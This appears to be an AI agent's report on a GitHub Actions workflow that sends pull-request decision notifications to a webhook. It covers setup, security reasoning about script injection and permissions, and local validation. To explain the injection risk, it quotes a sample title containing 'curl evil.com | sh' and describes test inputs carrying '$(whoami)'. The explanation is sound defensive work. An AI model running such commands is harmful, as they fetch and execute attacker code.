# Step 0 notify workflow — what it does, how to turn it on, and what I could not test

Task T6-4, run SEC-MARKET-FABLE-001. Built on branch `mon/notify`, pushed to `origin/mon/notify`.
Not merged anywhere. This report lives in the main checkout, untracked, for the coordinator to
read and decide what to do with.

## What the workflow does

File: `.github/workflows/notify-decision.yml`.

It fires when a pull request is opened, reopened, or marked ready for review, and checks whether
that pull request looks like the kind that needs the owner's decision: either its branch name
starts with `issue/` (the pattern the weekly draft-issue PRs already use, see `issue/2026-w37`,
currently open as PR #2), or it targets `preview` and carries a label called `needs-decision`. Any
other pull request is ignored — the workflow prints one line saying so and exits cleanly.

It also fires on demand from the Actions tab (`workflow_dispatch`), with a free-text message box,
so the owner or an agent can test delivery without opening a real pull request.

When it decides to send, it builds one short plain-text message and posts it to a webhook URL held
in the repository secret `DECISION_WEBHOOK_URL`. For a pull request, the message names the PR
title, links to the PR, and includes a guess at the Vercel preview URL built from the branch name
(lowercased, slashes turned to dashes, following the pattern
`https://security-market-pulse-git-<branch>-pikeholdings.vercel.app`). That URL is a guess, not a
lookup against Vercel, and the message says so — it can be stale or wrong if Vercel's own slug
rules ever diverge from that pattern. The message also states plainly that merging the pull
request into `preview` is the owner's approval, and that nothing reaches the live site until he
separately promotes `preview` to `main`, so a phone-tap merge cannot be mistaken for a publish.

If the secret is not set, the workflow still runs to completion and succeeds. It prints "No
DECISION_WEBHOOK_URL secret set; nothing sent." and does nothing else. It is harmless to merge and
enable before the owner adds a webhook.

The workflow makes no model calls, needs no API key, runs on no schedule, and touches nothing in
`web/`. It has read-only permissions (`contents: read`, `pull-requests: read`) and uses no
third-party GitHub Action — every step is a plain `run:` block, which is fewer moving parts than
`web.yml` already has (that workflow uses `actions/checkout` and `actions/setup-node`; this one
needs neither, since it only reads the pull-request event payload GitHub already hands it).

## Turning it on — about five minutes

1. Create a webhook. The simplest is a Slack incoming webhook: in Slack, add the "Incoming
   Webhooks" app to a channel you check, and copy the URL it gives you (starts with
   `https://hooks.slack.com/services/...`). If you would rather not add anything to Slack, a
   Discord webhook also works: create one in a Discord channel's integration settings, copy its
   URL, and add `/slack` to the end of it — Discord accepts the same simple `{"text": "..."}` body
   Slack does when you do that.
2. Add that URL as a GitHub repository secret named `DECISION_WEBHOOK_URL` (repo Settings →
   Secrets and variables → Actions → New repository secret).
3. Open the repo's Actions tab, select "notify-decision" in the left list, click "Run workflow",
   type any test message, and run it. You should see the message land in your channel within a
   few seconds. That single manual run is the whole test — it proves the secret and the webhook
   both work before anything real depends on it.

Once that works, the next real draft pull request whose branch starts with `issue/` (such as the
`2026-w37` draft that is open right now) will notify you the moment a future run creates one, with
no further setup. To make it notify on the PR sitting open today, either close and reopen that PR,
or add a `needs-decision` label to it (adding a label does not itself fire the workflow's trigger
types, so the practical way to test on an existing PR is the manual `workflow_dispatch` run above,
or to open a fresh PR).

## If you would rather use email instead of Slack

I did not build this option; here is what it would actually take, honestly. There is no such thing
as a generic email webhook the way there is for Slack or Discord — sending mail from a GitHub
Actions runner needs either a transactional email API (Resend, SendGrid, Mailgun, Postmark are the
usual choices, each needing an account and an API key stored as a second secret) or raw SMTP
credentials for a mailbox you control. Either way it is a few more lines in the same workflow: a
`curl` call to the provider's send-message API instead of the webhook, or a small `sendmail`-style
step for SMTP. The tradeoff against Slack: email adds a provider account and a credential to
manage, and a transactional-email API is generally not free at any volume the way a Slack workspace
webhook is. If you want this built, say so and name the provider; I did not build it because the
task asked me to describe it, not to add a second delivery path without your say-so.

## Security reasoning

**Why the pull request title and other fields cannot be used to run arbitrary shell or corrupt the
JSON.** GitHub Actions has a well-known injection hole: if you write `${{ github.event.pull_request.title
}}` directly into the text of a `run:` script, GitHub substitutes the raw, attacker-controlled
title into the script's source text before bash ever sees it — so a title containing something
like `` `curl evil.com | sh` `` becomes part of the command GitHub runs, not a piece of data. This
workflow never does that. Every value that comes from the pull request (title, URL, head branch,
base branch, labels) is passed in through the step's `env:` block, which hands it to the process as
an environment variable rather than pasting it into the script text. Bash's `"$VAR"` expansion
substitutes a variable's value as an opaque string — it does not re-parse that value for `$(...)`
or backticks, so even a title designed to look like a shell command stays inert text. The message
body itself is built by handing that text to `jq -n --arg text "$TEXT" '{text: $text}'`, which is
`jq`'s own safe way of embedding a string into a JSON document — it escapes quotes, backslashes,
and anything else that would otherwise break the JSON, so a hostile title cannot inject extra JSON
fields either. I tested this by hand with a title containing a real `$(whoami)`, backticks, quote
marks, and HTML-looking angle brackets; the resulting payload carried them as inert literal text,
confirmed by re-parsing the payload with `jq` (see "How I validated it" below).

**Why the permissions block is `contents: read` and `pull-requests: read` and nothing more.** The
workflow never writes to the repository, never comments on the pull request, and never needs to
check out any code, so there is no reason to grant it write access to anything. If the token it
receives were ever exposed or misused, the blast radius is "can read the repo and its pull
requests," not "can push, merge, or touch secrets elsewhere."

**Why this is `pull_request` and not `pull_request_target`.** `pull_request_target` runs with the
base repository's permissions and secrets even for a pull request opened from a fork, which is
exactly the pattern behind several real supply-chain attacks: a fork PR's untrusted code or
untrusted event data ends up running with access it should never have. `pull_request` runs with
only the read-only default token and, for a fork's PR, without repository secrets at all — the
correct, lower-privilege choice here, and the task explicitly ruled out the other option for this
reason.

## How I validated it

I do not have access to a real `DECISION_WEBHOOK_URL`, so I could not test an actual delivery to
Slack or Discord, and I could not trigger a real GitHub Actions run (that needs the branch pushed
and a workflow dispatch or a real pull-request event, which I am leaving for the coordinator to do
after review, per the task's instruction not to merge or open a PR).

What I did check:

- **YAML validity.** `actionlint` is not installed on this machine and the task says not to
  install it, so I parsed the file with Ruby's built-in YAML library
  (`ruby -ryaml -e "YAML.load_file(...)"`, Ruby 2.6.10, ships with macOS) and confirmed it loads
  without error into the exact structure I intended — one `pull_request` trigger with the three
  event types, one `workflow_dispatch` trigger with the `message` input, the `permissions` block,
  and one job with one step. One cosmetic note: Ruby's YAML parser reads the bare `on:` key as the
  boolean `true` rather than the string `"on"`, which is a known quirk of YAML 1.1 parsers and has
  no effect on GitHub's own workflow parser, which treats `on` as a fixed keyword regardless.
- **Shell syntax.** I extracted the `run:` script from the parsed YAML and checked it with
  `bash -n`, which parses a script for syntax errors without executing it. Clean.
- **Behavior, by running the actual script locally with mocked environment variables** standing in
  for what GitHub would supply, and a stubbed `curl` function that prints what it would have sent
  instead of making a network call. Five cases, all producing the expected result: no secret set
  (prints the harmless message, sends nothing); a pull request on an `issue/*` branch into
  `preview` (matches, builds the full message with a correct derived preview URL); a pull request
  on an unrelated branch name but carrying the `needs-decision` label into `preview` (matches on
  the label path); a pull request that matches neither rule (correctly ignored); and a manual
  `workflow_dispatch` run carrying a message deliberately loaded with `$(whoami)`, backticks, and
  quote marks (the injection check named above — it landed as inert text in valid JSON, confirmed
  by round-tripping the output back through `jq`).

What I could not test: the real webhook call and response handling (no secret exists to test
against), whether GitHub's own YAML schema validator accepts the file (only Ruby's generic YAML
parser was available), and an actual pull-request-triggered run on GitHub's runners (would require
pushing a test PR, which is outside this task's scope and better done by the coordinator after
review).
